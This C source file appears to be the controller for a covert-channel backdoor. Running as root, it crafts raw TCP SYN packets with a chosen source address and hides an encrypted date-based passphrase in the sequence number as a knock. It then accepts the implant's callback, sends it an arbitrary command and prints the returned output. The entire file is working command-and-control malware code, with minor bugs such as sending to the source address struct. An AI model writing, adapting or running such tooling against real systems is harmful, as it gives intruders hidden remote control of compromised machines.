#include "server.h"

int main (int argc, char *argv[])
{
    char *command;
    struct AddrInfo *addr;
    int opt = 0;

    addr = malloc(sizeof(struct AddrInfo));
    
    /* Change the UID/GID to 0 (raise to root) */
	if ((setuid(0) == -1) || (setgid(0) == -1))
    {
        systemFatal("You need to be root for this");
    }

    // Process the command line arguments
    while ((opt = getopt (argc, argv, OPTIONS)) != -1)
    {
        switch (opt)
        {
            case 'h':
                addr->SrcHost = optarg;
                break;
                
            case 'd':
                addr->DstHost = optarg;		// Destination Host name
                break;
                
            case 'p':
                addr->dport = atoi (optarg);
                break;
                
            case 's':
                addr->sport = atoi (optarg);
                break;
                
            case 'c':
                command = optarg;
                break;
                
            default:
            case '?':
                exit(0);
        }
    }
    
    sendKnock(addr);
    
    sendCommand(command);
    
    free(addr);
    
    return 0;
}

void sendKnock(struct AddrInfo *addr)
{
    char buffer[PCKT_LEN];
    char date[11];
    char *keyword = NULL;
    char *encryptedField = NULL;
    int sock = 0;
    int one = 1;
    const int *val = &one;
    struct ip *iph = (struct ip *) buffer;
    struct tcphdr *tcph = (struct tcphdr *) (buffer + sizeof(struct ip));
    struct sockaddr_in sin;
    struct sockaddr_in din;
    struct tm *timeStruct;
    time_t t;
    
    // Get the time and create the secret code
    time(&t);
    timeStruct = localtime(&t);
    strftime(date, sizeof(date), "%Y:%m:%d", timeStruct);
    keyword = strdup(PASSPHRASE);
    encryptedField = encrypt_data(keyword, date);
    
    // Fill out the addess structs
    sin.sin_family = AF_INET;
    din.sin_family = AF_INET;
    sin.sin_port = htons(addr->sport);
    din.sin_port = htons(addr->dport);
    sin.sin_addr.s_addr = inet_addr((addr->SrcHost));
    din.sin_addr.s_addr = inet_addr((addr->DstHost));
    
    // Zero out the buffer
    memset(buffer, 0, PCKT_LEN);
    
    // IP structure
    iph->ip_hl = 5;
    iph->ip_v = 4;
    iph->ip_tos = 16;
    iph->ip_len = sizeof(struct ip) + sizeof(struct tcphdr);
    iph->ip_id = htons(54321);
    iph->ip_off = 0;
    iph->ip_ttl = 64;
    iph->ip_p = 6;      // TCP
    iph->ip_sum = 0;    // Done by kernel
    
    iph->ip_src = sin.sin_addr;
    iph->ip_dst = din.sin_addr;
    
    // TCP structure
    tcph->th_sport = htons(addr->sport);
    tcph->th_dport = htons(addr->dport);
    memcpy(buffer + sizeof(struct ip) + 4, encryptedField, sizeof(__uint32_t));
    tcph->th_ack = 0;
    tcph->th_off = 5;
    tcph->th_flags = TH_SYN;
    tcph->th_win = htons(32767);
    tcph->th_sum = 0;	// Done by kernel
    tcph->th_urp = 0;
    
    // IP checksum calculation
    iph->ip_sum = csum((unsigned short *) buffer, (sizeof(struct ip) + sizeof(struct tcphdr)));
    
    // Create the socket for sending the packets
    sock = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock == -1)
    {
        systemFatal("Error creating raw socket");
    }
    
    // Inform the kernel do not fill up the headers' structure, we fabricated our own
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
    {
        systemFatal("setsocketopt failed");
    }
    //printf("Using:::::Source IP: %s port: %d, Target IP: %s port: %d.\n", (addr->SrcHost), addr->sport, (addr->DstHost), addr->dport);
    
    // Send the packet out
    if (sendto(sock, buffer, iph->ip_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0)
    {
        systemFatal("sendto failed");
    }
    
    // Cleanup
    if (close(sock) == -1)
    {
        systemFatal("Unable to close the raw socket");
    }
}

void sendCommand(char *command)
{
    int listenSocket = 0;
    int clientSocket = 0;
    int one = 1;
    int bytes_to_read = 0;
    char *bp = NULL;
    char buf[80];
    struct sockaddr_in client;
    
    socklen_t client_len;
    
    if ((listenSocket = socket(AF_INET, SOCK_STREAM, 0)) == -1)
    {
        systemFatal("Can't create a socket");
    }
    
    if (setsockopt(listenSocket, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one)) == -1)
    {
        systemFatal("setsockopt");
    }
    
    if (bind_address(CONNECTION_PORT, &listenSocket) == -1)
    {
        systemFatal("bind error");
    }
    
    listen(listenSocket, 5);
    
    client_len = sizeof(client);
    if((clientSocket = accept(listenSocket, (struct sockaddr *)&client, &client_len)) == -1)
    {
        fprintf(stderr,"cant accept cleint\n");
        exit(1);
    }
    printf("Connected IP: %s\n", inet_ntoa(client.sin_addr));
    
    // send command
    send(clientSocket, command, 80, 0);
    
    //receive response
    bp = buf;
    bytes_to_read = 80;
    
    while(recv(clientSocket, bp, bytes_to_read, 0) > 0 )
    {
        printf("%s\n",buf);
    }
    
    close(clientSocket);
    close(listenSocket);
}

// Simple checksum function, may use others such as Cyclic Redundancy Check, CRC
unsigned short csum(unsigned short *buf, int len)
{
    unsigned long sum;
    for (sum = 0; len > 0; len--)
        sum += *buf++;
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short) (~sum);
}